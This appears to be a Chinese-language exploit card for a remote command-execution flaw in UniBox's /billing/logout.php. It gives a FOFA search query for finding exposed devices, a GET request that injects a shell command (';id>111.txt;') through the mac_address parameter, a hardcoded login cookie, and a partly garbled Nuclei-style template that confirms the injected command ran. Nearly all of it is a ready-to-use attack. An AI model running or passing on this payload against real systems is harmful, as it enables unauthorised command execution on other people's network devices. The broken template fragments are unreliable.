# uniboxlogout.php存在命令执行漏洞

- **系统**：uniboxlogout.php　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="UniBox"`
- **请求**：`GET /billing/logout.php?logout_user=1&mac_address=;id>111.txt; HTTP/1.1`
- **关键头**：`Cookie: user=unibox; pass=294a3d333d2f6b7e121594189fce9a72`　`id: unibox-route-logout-rce`　`name: unibox-route-logout-rce`　`author: unknown`　`severity: high`　`description: The unibox route logout.php contains an RCE vulnerability.`　`tags: unibox, rce`　`fofa-query: body="UniBox"`

**请求体 / payload**
```
GET /billing/111.txt HTTP/1.1
Host:
Cookie: user=unibox; pass=294a3d333d2f6b7e121594189fce9a72
- raw:
-
Host: {{Hostname}}
Cookie: user=unibox; pass=294a3d333d2f6b7e121594189fce9a72
-
GET /billing/111.txt HTTP/1.1
Host: {{Hostname}}
Cookie: user=unibox; pass=294a3d333d2f6b7e121594189fce9a72
matchers:
- type: dsl
name: rce
dsl:
- "status_code_2 == 200 && contains(body_2,'uid=')"
```
- **预期**：200　|　—